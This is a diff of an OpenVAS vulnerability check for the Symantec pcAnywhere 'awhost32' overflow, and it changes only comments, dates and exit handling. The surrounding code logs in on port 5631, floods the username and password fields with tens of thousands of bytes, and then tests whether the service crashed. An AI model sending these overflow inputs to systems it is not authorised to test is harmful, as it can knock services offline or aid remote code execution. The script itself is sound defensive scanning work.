@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_symantec_pcanywhere_awhost32_code_exec_vuln.nasl 11357 2018-09-12 10:57:05Z asteins $
+# $Id: gb_symantec_pcanywhere_awhost32_code_exec_vuln.nasl 11405 2018-09-15 09:22:54Z cfischer $
 #
 # Symantec pcAnywhere 'awhost32' Remote Code Execution Vulnerability
 #
@@ -29,12 +29,12 @@ CPE = "cpe:/a:symantec:pcanywhere";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802884");
-  script_version("$Revision: 11357 $");
+  script_version("$Revision: 11405 $");
   script_cve_id("CVE-2011-3478", "CVE-2011-3479", "CVE-2012-0292", "CVE-2012-0291");
   script_bugtraq_id(51592);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:57:05 +0200 (Wed, 12 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:22:54 +0200 (Sat, 15 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-07-09 12:27:08 +0530 (Mon, 09 Jul 2012)");
   script_name("Symantec pcAnywhere 'awhost32' Remote Code Execution Vulnerability");
 
@@ -57,8 +57,8 @@ if(description)
   login and authentication data sent on TCP port 5631, which could be
   exploited by remote attackers to cause a buffer overflow condition.");
   script_tag(name:"solution", value:"Upgrade to Symantec pcAnywhere 12.5 SP4 or pcAnywhere Solution 12.6.7
-  or Apply Symantec hotfix TECH182142,
-  For updates refer to
+  or Apply Symantec hotfix TECH182142. For updates refer to
+
   http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120124_00");
   script_tag(name:"summary", value:"This host is running Symantec pcAnywhere and is prone to remote
   code execution vulnerability.");
@@ -86,16 +86,16 @@ if(!soc){
   exit(0);
 }
 
-## Send initial request
+# nb: Initial request
 initial = raw_string(0x00, 0x00, 0x00, 0x00);
 send(socket:soc, data: initial);
 sleep(2);
 resp = recv(socket:soc, length:1024);
 
-## Send Handshake Packet to Enter login details
+# nb: Handshake Packet to Enter login details
 handshake = raw_string(0x0d, 0x06, 0xfe);
 
-## Sending Login Request
+# nb: Login Request
 send(socket:soc, data: handshake);
 resp = recv(socket:soc, length:1024);
 
@@ -105,40 +105,33 @@ if(!resp || "Enter login name" >!< resp)
   exit(0);
 }
 
-## Constuct Malformed Username
+# nb: Malformed Username
 pcuser = raw_string(crap(data:raw_string(0x41), length: 30000));
 pcuser = pcuser + pcuser + pcuser;
 
-## Sending Malformed Username
 send(socket:soc, data: pcuser);
 sleep(3);
 
-## Constuct Malformed Password
+# nb: Malformed Password
 pcpass = raw_string(crap(data:raw_string(0x42), length: 28000));
 pcpass = pcpass + pcpass + pcpass ;
 
-## Sending Malformed Username
 send(socket:soc, data: pcpass);
 close(soc);
 sleep(3);
 
-## By sending initial request
-
 soc2 = open_sock_tcp(pcAnyport);
-if(!soc2)
-{
-  security_message(pcAnyport);
+if(!soc2){
+  security_message(port:pcAnyport);
   exit(0);
-}
-else
-{
-  ## Send the initial Request and check for response
+} else {
   send(socket:soc2, data: initial);
   resp = recv(socket:soc2, length:1024);
-  if(!resp)
-  {
-    security_message(pcAnyport);
+  close(soc2);
+  if(!resp) {
+    security_message(port:pcAnyport);
+    exit(0);
   }
 }
 
-close(soc2);
+exit(99);
